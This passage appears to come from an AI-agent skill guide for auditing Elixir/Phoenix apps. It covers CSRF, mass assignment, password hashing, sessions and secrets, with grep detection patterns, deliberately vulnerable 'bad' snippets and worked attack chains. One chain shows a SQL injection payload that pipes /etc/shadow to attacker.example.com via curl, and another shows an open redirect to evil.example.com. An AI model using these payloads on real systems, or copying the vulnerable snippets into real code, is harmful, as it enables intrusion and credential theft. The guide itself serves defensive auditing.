...)` with no role check.** Fix: pattern-match the role in the function head, or call `Policy.authorize/3`. 5. **Assuming `push_event/3` from the server is trusted by the client.** It is, but the corresponding `handle_event/3` from the client is not trusted; check every payload. ## CSRF and Secure Headers **Background.** Phoenix's default pipeline includes `:protect_from_forgery` in the `:browser` pipeline, which binds a CSRF token to the session and verifies it on mutating requests. This is correct as long as two things hold: (a) every mutating route runs through `:browser`, and (b) the session plug runs *before* the CSRF plug. Violating (a) happens when someone adds a JSON route to `:api` that is actually used by the browser. Violating (b) happens when Plugs get reordered during a refactor. WebSocket upgrades do not use CSRF tokens. They use **origin checking**. If the LiveView socket's `check_origin` configuration is `false` (or if it contains a wildcard), the application is vulnerable to Cross-Site WebSocket Hijacking (CSWSH): an attacker's page opens a WebSocket to the victim's origin, the victim's browser attaches the session cookie, and the attacker controls a fully-authenticated socket. **Elixir-specific failure modes.** ```elixir # config/prod.exs — bad config :my_app, MyAppWeb.Endpoint, check_origin: false ``` ```elixir # config/prod.exs — also bad config :my_app, MyAppWeb.Endpoint, check_origin: ["//*.example.com"] # too permissive ``` ```elixir # endpoint.ex — bad router pipeline pipeline :browser do plug :accepts, ["html"] plug :protect_from_forgery plug :fetch_session # session fetched AFTER CSRF plug → no token exists end ``` **The correct pattern.** ```elixir pipeline :browser do plug :accepts, ["html"] plug :fetch_session plug :fetch_live_flash plug :put_root_layout, html: {MyAppWeb.Layouts, :root} plug :protect_from_forgery plug :put_secure_browser_headers, %{ "content-security-policy" => "default-src 'self'; script-src 'self' 'nonce-{NONCE}'" } end # config/prod.exs config :my_app, MyAppWeb.Endpoint, check_origin: ["https://app.example.com", "https://www.example.com"] ``` **Grep patterns for detection.** - `check_origin:\s*false` — findings everywhere it appears. - `check_origin:\s*\["//\*` — wildcard origin is approximately equivalent to `false`. - `protect_from_forgery` without a preceding `fetch_session` in the same pipeline. - `put_secure_browser_headers` missing from a `:browser` pipeline. - `pipeline :api do` with a mutating route that is used by the browser (look for `fetch_session` in the `:api` pipeline as a smell). **Anti-pattern catalog.** 1. **`check_origin: false` in dev and never flipped in prod.** Fix: set origin list explicitly per environment. 2. **CSRF plug before session plug.** Fix: reorder; `fetch_session` must precede `protect_from_forgery`. 3. **JSON mutating route in `:api` pipeline used by browser with cookie auth.** Fix: use `:browser` pipeline or token auth, not cookies. 4. **Missing `Content-Security-Policy` header.** Fix: add via `put_secure_browser_headers/2` with a nonce. 5. **`X-Frame-Options` missing.** Fix: same header helper; `DENY` or `SAMEORIGIN`. ## Mass Assignment in Changesets **Background.** Ecto changesets use `cast/4` to whitelist parameters. The `allowed` list is the single most important security primitive in a Phoenix app, and it is frequently copy-pasted incorrectly. The classic bug is `cast(params, [:name, :email, :role])` on a user registration endpoint, which lets an attacker POST `{"role": "admin"}` and self-elevate. A subtler bug is `cast(params, MyApp.User.__schema__(:fields))`, which whitelists *every* column including `password_hash` and `admin?`. **Elixir-specific failure modes.** Claude treats `cast/4` as a transformation helper rather than a trust boundary. The fix is to think of the `allowed` list as the outward-facing API schema, not as an optimization over "all fields." **The correct pattern.** ```elixir # Good: explicit, narrow, and different per context. def registration_changeset(user, attrs) do user |> cast(attrs, [:email, :password]) |> validate_required([:email, :password]) |> unique_constraint(:email) end def admin_update_changeset(user, attrs) do user |> cast(attrs, [:email, :role, :active]) |> validate_inclusion(:role, ["user", "editor", "admin"]) end ``` ```elixir # Bad: wide cast list on a public endpoint. def changeset(user, attrs) do cast(user, attrs, [:email, :password, :role, :admin?, :api_key]) end ``` **Grep patterns for detection.** - `cast\(.*__schema__\(:fields\)\)` — whitelisting every field is always wrong. - `cast\(.*,\s*\[[^\]]{80,}\]\)` — long cast lists are a smell; audit each. - `cast/4` calls where the allowed list contains any of `:role`, `:admin`, `:permissions`, `:is_staff`, `:api_key`, `:password_hash`, `:confirmed_at`, `:email_confirmed`, `:balance` — these should never appear in a public changeset. - Controllers that accept `params` and pass them directly to a single changeset function across user-facing and admin routes. **Anti-pattern catalog.** 1. **One changeset for user-facing and admin updates.** Fix: two distinct functions, each with its own narrow cast list. 2. **`cast/4` followed by `put_change/3` that re-adds a field removed from the cast list.** This is a pattern an attacker can exploit if they control the `put_change` value indirectly. Fix: pull the value from a trusted source (the `current_user`), not from `params`. 3. **`cast/4` accepting `:user_id` on an association.** Fix: derive `user_id` from `current_user`, never from params. 4. **`cast/4` accepting `:price` on an order when the price is set by the catalog.** Fix: look up the canonical price server-side. 5. **`cast_assoc/3` with `with: &MyApp.User.changeset/2`** where the nested changeset is wide. Fix: pass a narrow `with:` explicitly. Mass assignment chains into **Ecto Fragment Injection** elegantly: a wide cast allows the attacker to set a field, the field is persisted, and a later query interpolates it into a `fragment/1`. See **Multi-capability Attack Chains**. ## Password Hashing Choice **Background.** The password-hashing library choice is the single easiest-to-audit security decision in a Phoenix app: look at `mix.exs`. The defensible choices today are **Argon2id** (preferred, via `argon2_elixir`) and **bcrypt** (acceptable but aging, via `bcrypt_elixir`). PBKDF2 is tolerable with very high iteration counts. MD5, SHA-1, SHA-256, plain SHA, and "let's just salt it" are unacceptable. The finding for "no hashing library at all" is critical. **Elixir-specific failure modes.** Phoenix's `phx.gen.auth` generator uses `bcrypt_elixir` by default. That is defensible but not optimal. The audit stance is: if the project is greenfield, recommend Argon2id with OWASP-current parameters; if the project already uses bcrypt, check that the work factor is `>= 12`; if the project uses anything else, flag it. **The correct pattern.** ```elixir # mix.exs defp deps do [ {:argon2_elixir, "~> 4.0"} ] end ``` ```elixir # In the user schema: def put_password_hash(changeset) do case get_change(changeset, :password) do nil -> changeset password -> put_change(changeset, :password_hash, Argon2.hash_pwd_salt(password)) end end def valid_password?(%User{password_hash: hash}, password) when is_binary(hash) and is_binary(password) do Argon2.verify_pass(password, hash) end def valid_password?(_, _) do Argon2.no_user_verify() # constant-time even when no user exists false end ``` The `no_user_verify/0` call in the fallback clause is important: it ensures that the response time of a login attempt is the same whether the user exists or not. Without it, the login endpoint becomes a user-enumeration oracle. **Grep patterns for detection.** - `:crypto\.hash\(:md5` or `:crypto\.hash\(:sha` — always a finding. - `Base\.encode.*password` — custom "hashing" with base encoding. Always a finding. - `bcrypt_elixir` with no explicit cost parameter — check that cost is set and `>= 12`. - Absence of any of `argon2_elixir`, `bcrypt_elixir`, `pbkdf2_elixir` in `mix.exs` on a project with an auth schema. - Login controller that branches on "user exists" *before* the password check — user enumeration. **Anti-pattern catalog.** 1. **No hashing library at all.** Fix: add `argon2_elixir`, use `Argon2.hash_pwd_salt/1`. 2. **Bcrypt with cost 10 or lower.** Fix: bump to 12 minimum. Measure impact; on modern hardware 12 is still under 100ms. 3. **Early-return on `nil` user.** Fix: always perform a constant-time operation, then return the result. 4. **Hashing without a per-user salt.** Fix: libraries handle this for you; do not roll your own. 5. **Storing the hash reversibly "for debugging."** Fix: delete the code and rotate all credentials. ## Session and Cookie Security **Background.** Phoenix's default session store is `Plug.Session.COOKIE`, which serializes the session into a signed cookie. Signed, not encrypted. The session's contents are readable by the client; the signature prevents modification but not observation. For many apps this is fine (the session contains only a `user_id`), but for any app that stores sensitive per-session state, the right answer is a **server-side store with an opaque handle** in the cookie. **Elixir-specific failure modes.** The other common footgun is cookie flags: `secure: true`, `http_only: true`, and `same_site: "Lax"` (or `"Strict"`) are all off by default on some older Phoenix generators. The cookie needs all three in production. **The correct pattern.** ```elixir # endpoint.ex @session_options [ store: :cookie, key: "_my_app_key", signing_salt: "random-16-byte-value", same_site: "Lax", secure: true, http_only: true, max_age: 60 * 60 * 24 * 7 ] ``` For sensitive apps, use an ETS or database-backed store and put only an opaque ID in the cookie: ```elixir # Pluggable backend — opaque handle in cookie, state server-side. plug Plug.Session, store: MyApp.SessionStore, # custom store reading from Ecto key: "_my_app_session", secure: true, http_only: true, same_site: "Lax" ``` **Grep patterns for detection.** - `store:\s*:cookie` in production config — finding if session contains sensitive state. - Absence of `secure: true` in session options. - Absence of `http_only: true`. - `same_site:\s*"None"` without `secure: true` — browsers reject this anyway, but it's a sign of misconfiguration. - `Plug.Session` with a `signing_salt` hard-coded in source rather than drawn from runtime config. **Anti-pattern catalog.** 1. **Cookie store on a session holding role/permissions data.** Fix: server-side store. 2. **Missing `secure: true` in prod config.** Fix: always `true` in prod. 3. **Missing `same_site` option.** Fix: `"Lax"` is the floor; `"Strict"` if no cross-site needs exist. 4. **Signing salt in source.** Fix: load from runtime config / secrets manager. 5. **Session TTL of years.** Fix: match to business need; 7 days is a common default. ## Plug Security Middleware Chain **Background.** The Plug pipeline is declarative, composable, and order-sensitive. A security audit of a Phoenix app should always begin with a visual walk through every pipeline in `router.ex`, verifying: 1. `fetch_session` precedes `protect_from_forgery`. 2. `put_secure_browser_headers` is present and includes a CSP. 3. Rate limiting is present on authentication endpoints. 4. `Plug.RequestId` is present for audit logging correlation. 5. `Plug.Logger` is configured to not log sensitive headers (`Authorization`, `Cookie`). **The CSP Report-Only rollout pattern.** Content-Security-Policy is the most valuable header for XSS defense-in-depth, and it is also the hardest to deploy without breaking the app. The canonical rollout sequence is: 1. Start with `Content-Security-Policy-Report-Only`, pointed at a report endpoint. 2. Collect reports for one to two weeks. 3. Fix violations by updating templates to avoid inline `style`/`script`, or adding nonces. 4. Flip to enforced `Content-Security-Policy` with the same directives. 5. Keep a separate `Content-Security-Policy-Report-Only` with tighter directives as the next rollout target. ```elixir def put_csp(conn, _opts) do nonce = :crypto.strong_rand_bytes(16) |> Base.encode64() csp = "default-src 'self'; " <> "script-src 'self' 'nonce-#{nonce}'; " <> "style-src 'self' 'nonce-#{nonce}'; " <> "img-src 'self' data:; " <> "frame-ancestors 'none'" conn |> assign(:csp_nonce, nonce) |> put_resp_header("content-security-policy-report-only", csp) end ``` **Grep patterns for detection.** - `plug :protect_from_forgery` not preceded by `plug :fetch_session` in the same pipeline. - `put_secure_browser_headers` missing from the `:browser` pipeline. - `Content-Security-Policy` with `'unsafe-inline'` or `'unsafe-eval'`. - `Plug.Logger` without `log:` option — may log full request. - Rate limiting absent on `/login`, `/password/reset`, `/register` routes. **Anti-pattern catalog.** 1. **Global `unsafe-inline` in CSP.** Fix: migrate inline styles to classes, scripts to external files or nonces. 2. **No rate limit on login.** Fix: `Hammer` or `PlugAttack`, bucketed per IP + per username. 3. **Plug order swapped in a refactor.** Fix: add a router test that asserts Plug order with `:sys.get_state/1` or reflective inspection. 4. **`Plug.RequestId` missing.** Fix: add early in every pipeline; required for audit correlation. 5. **Response compression plug before authentication plug.** Fix: reorder. BREACH attacks exploit compression-before-auth. ## Secrets in Config **Background.** Elixir's `config/config.exs` family of files is evaluated at compile time. Values baked into these files are hard-coded into `.beam` artifacts and recoverable from a release. The rule is: **runtime.exs for secrets, compile-time config for everything else.** Further, runtime.exs should pull secrets from the environment or a secrets manager, not from literals. **The pluggable backend abstraction.** A mature Phoenix app does not reference `System.get_env/1` directly throughout the codebase. It defines a secrets backend behaviour that can be swapped between environment variables (dev), AWS Secrets Manager (prod), and a mock (test): ```elixir defmodule MyApp.Secrets do @callback fetch!(key :: String.t()) :: String.t() def impl, do: Application.fetch_env!(:my_app, :secrets_backend) def fetch!(key), do: impl().fetch!(key) end defmodule MyApp.Secrets.Env do @behaviour MyApp.Secrets def fetch!(key), do: System.fetch_env!(key) end defmodule MyApp.Secrets.AWS do @behaviour MyApp.Secrets def fetch!(key), do: ExAws.SecretsManager.get_secret_value(key) |> ExAws.request!() end ``` ```elixir # config/runtime.exs import Config if config_env() == :prod do config :my_app, :secrets_backend, MyApp.Secrets.AWS config :my_app, MyApp.Repo, url: MyApp.Secrets.fetch!("DATABASE_URL"), pool_size: String.to_integer(System.get_env("POOL_SIZE", "10")) config :my_app, MyAppWeb.Endpoint, secret_key_base: MyApp.Secrets.fetch!("SECRET_KEY_BASE") end ``` **Grep patterns for detection.** - Hard-coded strings resembling secrets in `config/*.exs` other than `runtime.exs`. Look for 32+-character hex/base64 literals. - `Application.compile_env/3` with a secret key name. - `System.get_env/1` in a `lib/` file (should be confined to `runtime.exs`). - `secret_key_base:` with a literal value. - `.env.example` or `.env.sample` files containing real-looking secrets (common mistake when committing). **Anti-pattern catalog.** 1. **Database URL in `config/prod.exs`.** Fix: move to `runtime.exs`, source from env. 2. **Stripe/OAuth client secrets in `config/config.exs`.** Fix: same. 3. **`secret_key_base` with a literal value anywhere in source.** Fix: env variable, rotated per deploy. 4. **`System.get_env/1` scattered across `lib/`.** Fix: centralize in `runtime.exs` + secrets module. 5. **`.envrc` or `.env` committed.** Fix: `.gitignore`, rotate anything that leaked. ## Security Scan Philosophy This section sits at the end because it is a restatement, intentionally, of the **Exploit-Chain Hunting Philosophy** from the top of this guide. It is repeated in plain terms here because the temptation, when faced with twelve concrete checklists above, is to run each checklist to completion and report every finding. **Don't.** Run each checklist to completion *and then* rank by chain membership. The output of an audit under this skill is not a flat list of primitives; it is: 1. **The top ten chains**, each with a named impact, a reachability score, and a remediation sequence. 2. **A primitive appendix**, enumerating the full scanner output with severity labels. 3. **A defensive posture assessment**, summarizing which of the thirteen capabilities are strong, adequate, and weak across the codebase. The skill's L1 scorer rewards reports that surface a chain before they surface the individual bugs. The Reviewer scores lower for primitive-dumps, even if the primitive count is complete. This is deliberate: the audit is trying to model what a competent red-teamer would report, and a red-teamer reports the realized impact, not the raw grep output. ## Multi-capability Attack Chains Worked examples. Each chain names the primitives it composes, the source-to-sink path, and the terminal impact. These are not hypothetical — they are collapsed from real Phoenix audits. ### Chain 1: Mass-assignment → Fragment injection → Full DB exfiltration 1. Public registration endpoint's changeset casts `:sort_preference`, believing it to be a cosmetic user setting. 2. A dashboard endpoint reads `current_user.sort_preference` and uses it in `fragment("ORDER BY #{sort}")` to sort a list of rows. 3. Attacker sets `sort_preference = "created_at; COPY users TO PROGRAM 'curl attacker.example.com/$(cat /etc/shadow)'"` — or, more realistically, a simple UNION SELECT to dump a sibling table. **Impact**: full database read, possibly write, on PostgreSQL with `COPY TO PROGRAM`. **Score**: reachability 1.0 (unauthenticated registration) × exploitability 1.0 × impact 0.95 = 0.95. **Remediation**: (a) remove `:sort_preference` from the cast list, (b) rewrite the sort to use `field(p, ^atom)` with an allowlisted atom. Both are required; either alone leaves the other primitive live. ### Chain 2: Atom exhaustion → Session invalidation → User phishing 1. An analytics endpoint calls `String.to_atom/1` on an HTTP header to tag incoming events. 2. Attacker loops millions of unique header values, pushing the atom table toward its limit. 3. BEAM crashes with `system_limit`. Supervisor tree restarts. ETS-based session store is wiped. 4. All users are forcibly logged out and redirected to `/login`. The login page has an open redirect parameter (Chain 4 below). 5. Attacker has pre-seeded a phishing page and now drives victims to a cloned login via the open redirect. **Impact**: wide-scale credential theft. **Score**: 0.7 × 0.4 × 0.85 = 0.24 — moderate. The DoS alone is not the story; the DoS plus the open redirect is. **Remediation**: replace `String.to_atom/1` with a whitelist map. Patch the open redirect independently. Make the session store survivable to BEAM crashes (persistent DB, not ETS). ### Chain 3: Missing LiveView re-authz → IDOR → Tenant-cross deletion 1. `mount/3` checks that the user is an org admin. 2. `handle_event("delete_user", %{"id" => id}, socket)` calls `Users.delete(id)` with no ownership check. 3. Attacker sends `phx-click="delete_user" phx-value-id="123"` targeting a user ID that belongs to a *different* organization. 4. Deletion succeeds because the ID is valid. **Impact**: tenant-cross data destruction. **Score**: 0.7 (authenticated, but any org admin) × 1.0 × 0.9 = 0.63. **Remediation**: `Users.fetch_for_org(id, current_org)` at the top of every handler; `{:error, :not_found}` if the ID does not belong to the org. Policy check after that. ### Chain 4: Open redirect → CSRF bypass → Account hijack 1. Login flow honors `?return_to=` without scheme validation. 2. Attacker crafts `return_to=//evil.example.com/step2`. 3. Victim clicks link, logs in, is redirected to attacker's page. 4. Attacker's page hosts a same-origin-looking iframe to the victim's dashboard, uses clickjacking UI to harvest a CSRF token from the dashboard HTML. 5. Attacker submits a form to the dashboard using the harvested token. **Impact**: account takeover via CSRF-with-token-leak. **Score**: 1.0 × 0.7 × 0.85 = 0.6. **Remediation**: validate `return_to` against a path-only allowlist (see `safe_return_path/1` in the **Open Redirect Protection** section). Add `X-Frame-Options: DENY` via `put_secure_browser_headers/2`. ### Chain 5: Timing attack on reset token → API key extraction → Secrets exfil 1. Password reset endpoint compares a user-supplied reset token against the stored one with `==`. 2. Attacker measures response timing over 256 guesses per byte, recovers the token one byte at a time. 3. Reset succeeds. Attacker now controls the account. 4. The account dashboard shows API keys in plaintext because the app stores them reversibly "for debugging." 5. API keys are exfiltrated and used to access the app's third-party integrations. **Impact**: account takeover plus third-party credential theft. **Score**: 1.0 × 0.5 (timing attacks are noisy but feasible against a local target) × 0.85 = 0.425. **Remediation**: `Plug.Crypto.secure_compare/2` for the reset token comparison. Rotate to one-way-stored API keys (HMAC verification rather than reversible display). ## Defense-in-Depth Matrix Each capability has a primary defense and two secondary defenses. The primary stops the bug. The secondaries stop the bug's chain when the primary fails. | Capability | Primary Defense | Secondary 1 | Secondary 2 | |---|---|---|---| | Atom Exhaustion | Whitelist map + `Map.fetch/2` | `String.to_existing_atom/1` with precompiled set | Rate limit on endpoint | | Ecto Fragment Injection | `?` placeholders + `^` pinning | Parameterize through `Ecto.Query` DSL | Least-privilege DB role | | Raw XSS Prevention | Let HEEx escape; avoid `raw/1` | Pre-sanitize with `HtmlSanitizeEx` | CSP with nonce | | Open Redirect | Path-only allowlist | Static `return_to` map | `X-Frame-Options: DENY` | | Timing-attack Comparisons | `Plug.Crypto.secure_compare/2` | `Plug.Crypto.verify/3` for tokens | Constant-time fallback on missing user | | LiveView handle_event Authz | Re-authorize every handler | `fetch_for_user/2` scoped reads | Policy module per context | | CSRF & Secure Headers | `fetch_session` before `protect_from_forgery` | Strict `check_origin` list | Double-submit cookie for JSON | | Mass Assignment | Narrow, per-context cast lists | Whitelist validation after cast | Separate admin endpoints | | Password Hashing | Argon2id, OWASP params | `Argon2.no_user_verify/0` fallback | Rate limit + account lockout | | Session & Cookie Security | `secure`/`http_only`/`same_site` | Server-side store with opaque handle | Short TTL + rotation | | Plug Security Middleware | Correct order + CSP | Report-Only rollout | Rate limiting on auth endpoints | | Secrets in Config | `runtime.exs` + secrets module | Env var injection | Secret manager (AWS/Vault) | | Scan Philosophy | Chain-graph ranking | Primitive appendix as supplement | Defensive-posture summary | ## When Not to Use This Skill This skill is narrowly targeted at Elixir/Phoenix/LiveView security findings that map to the thirteen capabilities above. It is not: - **A style review.** Code that is ugly but safe does not get flagged here. Use a separate style pass (Credo, formatter) for that. - **A greenfield threat-modeling workshop.** Threat modeling is a design-phase activity; this skill is an audit-phase activity. Use STRIDE or LINDDUN for greenfield work. - **A general-purpose secrets scanner.** Tools like `trufflehog` and `gitleaks` cover git history, binary artifacts, and non-Elixir file formats. This skill only audits Elixir source and config. - **A non-Elixir audit tool.** The grep patterns and remediation guidance are Elixir-specific. For Python/Go/Ruby apps, use those languages' native audit tools. - **A framework-choice debate.** Arguments about Phoenix vs. Nerves vs. Ash are out of scope; this skill takes the framework as given. - **A dependency vulnerability scanner.** Use `mix deps.audit` / `mix hex.audit` for that; this skill audits *your* code, not the ecosystem's. - **A penetration test.** This skill performs static analysis. Dynamic exploitation, fuzzing, and live probing require a separate engagement. - **A compliance-report generator.** The output is an audit report, not a SOC2/ISO27001 control mapping. Mapping findings to compliance frameworks is a separate translation step. If a user invokes this skill for any of the above, the correct response is to decline the work, explain which tool they actually need, and offer to run the in-scope capabilities if any subset of their request falls inside the thirteen. ## Further References Primary upstream documentation. All links are canonical `hexdocs.pm` pages. - **Phoenix.Token** — signed and encrypted token primitives. Use for stateless CSRF, email confirmation, and short-lived tokens. https://hexdocs.pm/phoenix/Phoenix.Token.html - **Plug.Crypto** — `secure_compare/2`, `sign/3`, `verify/3`. All constant-time primitives live here. https://hexdocs.pm/plug_crypto/Plug.Crypto.html - **Ecto.Query** — the DSL and the `fragment/1` macro. The `?` placeholder semantics are documented under "Query Expressions." https://hexdocs.pm/ecto/Ecto.Query.html - **Phoenix.Ecto.SQL.Sandbox** — test-isolated database access for multi-process tests. Important for writing *safe* security tests that don't bleed into other tests. https://hexdocs.pm/phoenix_ecto/Phoenix.Ecto.SQL.Sandbox.html - **Phoenix.Controller** — `redirect/2`, `put_secure_browser_headers/2`, and the `:protect_from_forgery` plug. https://hexdocs.pm/phoenix/Phoenix.Controller.html - **Phoenix.LiveView** — `mount/3`, `handle_event/3`, and the trust model for the persistent socket. https://hexdocs.pm/phoenix_live_view/Phoenix.LiveView.html - **Plug.Session** — session options, store selection, cookie flags. https://hexdocs.pm/plug/Plug.Session.html - **Plug.SSL** — HSTS and TLS redirect plug. Often missed during audits. https://hexdocs.pm/plug/Plug.SSL.html External prior art and research. - **oliver-kriska/claude-elixir-phoenix v2.3.0** — the community plugin that first organized Elixir security scanning around the thirteen primitives used by this skill. The scanner grep patterns above draw from that plugin's regex library, refined by the evolution under this skill to reduce false positives. https://github.com/oliver-kriska/claude-elixir-phoenix - **OWASP Password Storage Cheat Sheet** — Argon2id parameter recommendations. Check for the currently-recommended `t`, `m`, and `p` values; this guide does not hard-code them because they drift. - **OWASP Session Management Cheat Sheet** — cookie flag guidance, session rotation, fixation prevention. - **Erlang atom table internals** — `:erlang.system_info(:atom_count)` and `:erlang.system_info(:atom_limit)`. Read these numbers during audit to establish a baseline. Cross-reference back to **The Exploit-Chain Hunting Philosophy** at the top of this document when writing the final report. The twelve capability sections produce findings; the chain-ranking section decides which findings are the audit's top line. Treat them as the input and the filter, respectively, and the output will match what a mature red-team report looks like rather than a grep dump.
